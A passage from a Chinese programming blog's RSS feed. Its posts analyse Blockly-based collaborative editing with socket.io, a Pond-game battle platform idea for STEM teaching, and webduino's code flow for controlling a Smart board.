&lt;p&gt;我们来看看&lt;a href="https://github.com/ucanbaklava/socketblockly"&gt;socketblockly&lt;/a&gt;是怎么做的&lt;/p&gt;
&lt;h2&gt;思路&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://github.com/ucanbaklava/socketblockly"&gt;socketblockly&lt;/a&gt;的解决方案简单粗暴，简单来说，就是观察workspace中是否有变化，如果有变化，就把blocks转变为xml(序列化之后变成普通的文本同步问题)通知出去，其他用户在本地做反序列化，用新的blocks更新本地的workspace,如此就实现了编辑的同步(也就是协同)&lt;/p&gt;
&lt;p&gt;简而言之，如果你意识到blocks与xml是可以相互转化的，那么这件事就是一个普通的(文本)协同编辑问题&lt;/p&gt;
&lt;h2&gt;源码分析&lt;/h2&gt;
&lt;p&gt;因为有实时性的要求，主要使用了&lt;a href="https://github.com/socketio/socket.io"&gt;socket.io&lt;/a&gt;来做实时通信&lt;/p&gt;
&lt;h4&gt;server端&lt;/h4&gt;
&lt;p&gt;server端非常简单,一目了然&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  &lt;span class="nx"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;on&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;new xml&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;xml&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;broadcast&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;emit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;rebuild workspace&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;xml&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="p"&gt;})&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;监听新消息(new xml),并将其广播给其他客户端&lt;/p&gt;
&lt;h4&gt;client端&lt;/h4&gt;
&lt;p&gt;client端也干净利索&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;workspace&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;Blockly&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;inject&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;blocklyDiv&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;workspaceOptions&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;updateWorkspace&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;event&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;event&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;type&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nx"&gt;Blockly&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Events&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;UI&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="nx"&gt;event&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;type&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nx"&gt;Blockly&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Events&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;CREATE&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt;

  &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;xml&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;Blockly&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Xml&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;workspaceToDom&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;workspace&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;xml_text&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;Blockly&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Xml&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;domToText&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;xml&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

  &lt;span class="nx"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;emit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;new xml&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;xml_text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nx"&gt;workspace&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;addChangeListener&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;updateWorkspace&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="nx"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;on&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;rebuild workspace&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;xml&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;Blockly&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Events&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;disable&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="nx"&gt;workspace&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;clear&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;xmlData&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;Blockly&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Xml&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;textToDom&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;xml&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="nx"&gt;Blockly&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Xml&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;domToWorkspace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;xmlData&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;workspace&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="nx"&gt;Blockly&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Events&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;enable&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="p"&gt;})&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;基本就是前头思路的代码实现，workspace中的blocks转为xml通过:&lt;code&gt;let xml = Blockly.Xml.workspaceToDom(workspace)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;而xml还原为界面元素(blocks)通过:&lt;code&gt;var xmlData = Blockly.Xml.textToDom(xml); Blockly.Xml.domToWorkspace(xmlData, workspace)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;用户的编辑事件通过:&lt;code&gt;workspace.addChangeListener(updateWorkspace)&lt;/code&gt; 捕获，并回调updateWorkspace函数.&lt;/p&gt;
&lt;p&gt;关于blockly的事件机制可以参考:&lt;a href="https://developers.google.com/blockly/guides/configure/web/events"&gt;blockly events&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;演示&lt;/h2&gt;
&lt;p&gt;&lt;img alt="" src="http://os54tv4fc.bkt.clouddn.com/blockly_socket.gif" /&gt;&lt;/p&gt;
&lt;p&gt;你可以在&lt;a href="http://socketblockly.herokuapp.com/"&gt;demo&lt;/a&gt;里自己尝试(开2个浏览器)&lt;/p&gt;
&lt;h3&gt;todo&lt;/h3&gt;
&lt;p&gt;建议将&lt;a href="https://github.com/ucanbaklava/socketblockly"&gt;socketblockly&lt;/a&gt;视为一个最小原型，可以改进的地方还有很多，诸如:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;加上房间的概念(类似&lt;a href="https://github.com/mozilla/togetherjs"&gt;togetherjs&lt;/a&gt;),以支持多对用户的协作,社区里有人尝试&lt;a href="https://blockly-realtime-collab.appspot.com/static/demos/realtime/index.html"&gt;blockly-realtime-collab&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;加上&lt;a href="https://github.com/mozilla/togetherjs"&gt;togetherjs&lt;/a&gt;,使协同工作者能以代码之外的方式沟通，而不必离开当前界面（类似我同时使用tmux和微信语音）&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 27 Jun 2017 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2017-06-27:blockly-pair-programming.html</guid><category>code</category></item><item><title>基于Pond的对战平台(构想)</title><link>/blockly-game-pond.html</link><description>&lt;h1&gt;关于Pond&lt;/h1&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/pondbfcc9bf0.png" /&gt;&lt;/p&gt;
&lt;p&gt;Pond是一款可编程的对战类游戏，来自google团队，基于&lt;a href="https://github.com/google/blockly-games"&gt;blockly-game&lt;/a&gt;构建,而blockly-game基于&lt;a href="https://github.com/google/blockly"&gt;blockly&lt;/a&gt;，可以认为是利用blockly来构建游戏的脚手架，关于blockly可以参考我之前的文章:&lt;a href="http://blog.just4fun.site/blockly-overview.html"&gt;blockly入门与介绍&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这个游戏的界面元素很简单&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/pond8da15e05.png" /&gt;&lt;/p&gt;
&lt;p&gt;在一个池塘里，有4只鸭子(duck)，它们可以在池塘里游动(Swim),扫描周围的鸭子(Scan)，并发射大炮(Cannon)彼此攻击.&lt;/p&gt;
&lt;p&gt;Swim、Scan、Cannon等策略都被封装为了blockly积木&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/ponde5b1edce.png" /&gt;&lt;/p&gt;
&lt;p&gt;通过拼搭blockly积木你将赋予鸭子以智慧让它闯荡江湖。&lt;/p&gt;
&lt;h2&gt;上手&lt;/h2&gt;
&lt;p&gt;上手这个游戏的最佳策略就是将&lt;a href="https://blockly-games.appspot.com/pond-tutor?lang=zh-hans&amp;amp;level=1"&gt;入门关卡&lt;/a&gt;一一打通(和大多有趣的资源一样，你需要翻墙访问它)，一共是10个小关卡,每个关卡都会教会你鸭子的技能，这和大多数手游引导很像（没错,包括王者农药）&lt;/p&gt;
&lt;p&gt;&lt;img alt="1" src="http://oav6fgfj1.bkt.clouddn.com/pond6f3d8087.png" /&gt;&lt;/p&gt;
&lt;p&gt;截图是入门引导的第一关，这一关里你将学会使用大炮技能，通过调整大炮的角度和射程，你将击中周围的鸭子&lt;/p&gt;
&lt;p&gt;如果你不清楚新技能的使用，可以查看右下角的帮助文档&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/pondc6f8dcce.png" /&gt;&lt;/p&gt;
&lt;p&gt;其他关卡就不一一介绍，教程设计得非常好，跟着打怪通关就行&lt;/p&gt;
&lt;h2&gt;开战&lt;/h2&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/pondc7ae5d20.png" /&gt;&lt;/p&gt;
&lt;p&gt;正式开战的时候，战场上有四只鸭子，你控制着左上角的小黄鸭。右边是编辑区域，你可以在其中使用blockly积木块来编辑你的战术，当然你也可以直接手写代码来编写战术&lt;/p&gt;
&lt;p&gt;我们来看下我们的鸭子从战五渣到屌屌哒的转变历程&lt;/p&gt;
&lt;p&gt;首先是呆如可达鸭的版本，只发射一枚大炮，之后呆呆地啥也不干&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://os54tv4fc.bkt.clouddn.com/pond0.gif" /&gt;&lt;/p&gt;
&lt;p&gt;不出所料，一会儿就阵亡了&lt;/p&gt;
&lt;p&gt;接着我们让我们的鸭子扫描周围，如果有敌人进入，就打它&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://os54tv4fc.bkt.clouddn.com/pond1.gif" /&gt;&lt;/p&gt;
&lt;p&gt;哎依然活不久，细心的你可能发现， 那只小黑鸭非常聪明，它像狙击手一样(这也正是它的名字)，躲得远远的打一下就跑,电视里的狙击手要是呆着不动的话，活不过第一集的&lt;/p&gt;
&lt;p&gt;最后我们放一个能干翻所有电脑玩家的小黄鸭&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://os54tv4fc.bkt.clouddn.com/pond2.gif" /&gt;&lt;/p&gt;
&lt;h1&gt;对战平台&lt;/h1&gt;
&lt;p&gt;基于Pond可以构建一个对战平台（适合K12/STEM教育），参赛选手们用积木块为自己的参赛鸭子构建战斗策略（就在当前的&lt;a href="https://blockly-games.appspot.com/pond-tutor?lang=zh-hans&amp;amp;level=1"&gt;测试环境&lt;/a&gt;里构建即可），完成之后提交到平台上，之后平台随机将选手分为四人一组，展开战斗,每轮中的获胜者继续分组，如此循环，可以得到各自的名次&lt;/p&gt;
&lt;p&gt;至于对战平台的技术架构，非常简单，将用户提交的作战策略generate为文本/代码，之后序列化它，存储下来,后台做好分组，在比赛的时候，加载出战略代码，反序列化，并运行它们，(每个分组可以是一个房间，通过url进入)，参赛选手可在每个房间里观看对战记录，当然他们肯定也会乐于分享给朋友一起看&lt;/p&gt;
&lt;p&gt;所以这块后台就只要简单存储代码片段就行了 (积木到代码的转化参考blockly的文档)&lt;/p&gt;
&lt;h1&gt;教学相关&lt;/h1&gt;
&lt;p&gt;我在过去的半年，使用blockly主要是在做STEM教育项目，那么这个对战平台能承载哪些教学内容呢? 下边举几个例子&lt;/p&gt;
&lt;p&gt;就编程教学而言，可以涵盖的话题很广，从编程的基本概念(序列/条件/循环)， 到具体的元素(变量/函数).另外值得一提的是，这些内容的教学是可选的，例如孩子们可以不必掌握函数来编写作战策略，可他们会发现，一旦他们掌握了函数，那么就可以利用这个新概念，构建更庞大的战略系统,而不会被庞大的代码压垮，同时他们也可能学会重用代码,他们会觉得函数不是一种学习负担，而是一个组织代码和思路的有力工具. &lt;/p&gt;
&lt;p&gt;就数学而言，涵盖了角度、距离、坐标这些概念，和前边一样，不掌握这些概念，你也能参赛，掌握之后，你更容易制霸全场. 知识就是力量在这里显露无疑 (正式因为每个阶段学生的知识悬殊，你可以构建少儿组、青少组或者小学组、初中组)&lt;/p&gt;
&lt;p&gt;除了数理逻辑方面的教学，你也能用于引入历史典故，许多优秀的鸭子采用的战术可以从历史上(如《三十六计》)找到原型,前头获胜的鸭子在早期就采用了&lt;code&gt;以逸待劳&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果你的兴趣是编写鸭子后边的人，你想通过猜测他们的策略而决定自己的策略 ,这在和你熟悉的同学pk的时候，尤其有用，他的性格很可能决定他的鸭子的性格(喜欢逃跑或是鲁莽冲撞)，那么心理学/博弈很容易引入进来，所谓知己知彼 百战不殆&lt;/p&gt;
&lt;p&gt;对于少部分有怀疑/创造精神同学，可能会指出这个游戏不合理，他们会给出改进游戏的建议，他们想制作更有趣的游戏规则，诸如允许团队作战，这个时候，因为游戏的源码开放性，可以把这部分同学引入到游戏的设计上来，通过修改源码，构建自己的游戏规则和平台&lt;/p&gt;
&lt;h1&gt;技术视角&lt;/h1&gt;
&lt;p&gt;下边我们切换到技术视角，来分析下这个游戏的源码结构和重要的实现细节,如果我们要将它改造为对战平台，理解源码是必经之路&lt;/p&gt;
&lt;p&gt;我们带着几个问题来阅读源码的关键部分，之后顺藤摸瓜即可&lt;/p&gt;
&lt;p&gt;如果你有看不懂的地方请翻阅&lt;a href="https://github.com/google/blockly-games/wiki"&gt;blockly-game的文档&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;blockly-game最坑的地方是使用了&lt;a href="https://github.com/google/closure-compiler"&gt;closure-compiler&lt;/a&gt;,如果看到奇奇怪怪的东西，基本来自closure-compiler&lt;/p&gt;
&lt;h3&gt;点击&lt;code&gt;运行程序&lt;/code&gt;按钮后都发生了什么&lt;/h3&gt;
&lt;p&gt;首先从前端入手，我们跟踪点击&lt;code&gt;运行程序&lt;/code&gt;按钮后都发生了什么?&lt;/p&gt;
&lt;p&gt;我们追踪到&lt;a href="https://github.com/google/blockly-games/blob/master/appengine/pond/js/pond.js#L115"&gt;Pond.runButtonClick&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;我们提交的代码/积木块在哪里被运行&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://github.com/google/blockly-games/blob/master/appengine/pond/js/pond.js#L152"&gt;Pond.execute&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;参赛选手的初始化&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://github.com/google/blockly-games/blob/d6f3e3217d8f886a963269dd3950321e526d0fde/appengine/pond/duck/js/duck.js#L149"&gt;var players&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这一行也值得留意&lt;a href="https://github.com/google/blockly-games/blob/master/appengine/pond/duck/js/duck.js#L190"&gt;Pond.Battle.addAvatar(name, code, playerData.start, playerData.damage);&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;电脑控制的鸭子的战斗策略在哪里定义&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://github.com/google/blockly-games/blob/master/appengine/pond/duck/template.soy#L209"&gt;playerCounter&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;战斗的过程(运行每个鸭子的作战策略)&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://github.com/google/blockly-games/blob/master/appengine/pond/js/battle.js#L330"&gt;Pond.Battle.updateInterpreters_&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;一些边缘问题&lt;/h1&gt;
&lt;h3&gt;健壮性&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;任何时候不要相信用户的输入&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;构建一个系统，我们永远不该忘记上边这条箴言&lt;/p&gt;
&lt;p&gt;如果某个用户输入的战斗策略有误，会不会影响战斗的进行?&lt;/p&gt;
&lt;p&gt;这单可以放心，有误的战斗策略，会导致这个用户被淘汰，但不影响比赛的继续进行&lt;/p&gt;
&lt;h1&gt;一些改进的空间&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;更好的汉化&lt;/li&gt;
&lt;li&gt;增强鸭子对环境的感知(比如看得到其他人的血槽)&lt;/li&gt;
&lt;li&gt;引入物理引擎,力、冲量、加速度,使战斗更真实&lt;/li&gt;
&lt;li&gt;积木块的目前参数不完备,诸如swim没有速度参数(只能在js里写)&lt;/li&gt;
&lt;li&gt;对于高年级学生，可以增加活动空间，与其他设施，像掩体之类&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 26 Jun 2017 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2017-06-26:blockly-game-pond.html</guid><category>code</category></item><item><title>对webduino运行流程的分析</title><link>/webduino-analysis.html</link><description>&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/webduinoee40c06e.png" /&gt;&lt;/p&gt;
&lt;h1&gt;背景&lt;/h1&gt;
&lt;p&gt;在前一篇关于blockly的文章中，我参考了webduino对Web Speech的包装，并将其移植到blockly4pi中。&lt;/p&gt;
&lt;p&gt;webduino对blockly的使用，有许多出彩的地方。这篇文章将简要对其核心部分做个分析，为了更深入地借鉴它的设计&lt;/p&gt;
&lt;h1&gt;入手&lt;/h1&gt;
&lt;p&gt;我买了webduino的smart模块，所以我们从最简单的案例入手：将smart的led灯设为红色&lt;/p&gt;
&lt;p&gt;首先当然是将smart连上wifi，完成后它分配到网址:&lt;code&gt;192.168.0.119&lt;/code&gt;（显示在wifi名称中）&lt;/p&gt;
&lt;p&gt;接着我们拼搭出积木块&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/webduino5a6e33a8.png" /&gt;&lt;/p&gt;
&lt;p&gt;运行后，成功点亮红灯&lt;/p&gt;
&lt;h1&gt;分析&lt;/h1&gt;
&lt;p&gt;首先查看上边的积木生成的代码:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;rgbled&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="nx"&gt;boardReady&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="nx"&gt;board&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Smart&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;url&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;192.168.0.119&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;board&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nx"&gt;board&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;systemReset&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
  &lt;span class="nx"&gt;board&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;samplingInterval&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="nx"&gt;rgbled&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;getRGBLedCathode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;board&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="nx"&gt;rgbled&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setColor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;#ff0000&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;可以看到webduino通过积木生成js代码, 然后运行js代码来控制start.(我的blockly4pi同时生成js和python)&lt;/p&gt;
&lt;p&gt;容易看出,boardReady是浏览器与start通信的代理,接着我们进入&lt;a href="https://github.com/webduinoio/webduino-blockly"&gt;源码&lt;/a&gt;,去跟踪&lt;code&gt;boardReaety&lt;/code&gt;,它定义在&lt;a href="https://github.com/webduinoio/webduino-blockly/blob/19e40f0108e72dbd08628705a1e4fad9c3ccab7e/webduino-blockly.js#L21"&gt;这里&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;boardReady&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;options&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;autoReconnect&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;callback&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;callback&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;typeof&lt;/span&gt; &lt;span class="nx"&gt;autoReconnect&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;function&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="nx"&gt;autoReconnect&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;callback&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
        &lt;span class="nx"&gt;index&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;boards&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;length&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="nx"&gt;board&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;createBoard&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;options&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
        &lt;span class="nx"&gt;terminate&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;board&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;delete&lt;/span&gt; &lt;span class="nx"&gt;boards&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;index&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="nx"&gt;boards&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;splice&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;index&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;autoReconnect&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;setTimeout&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
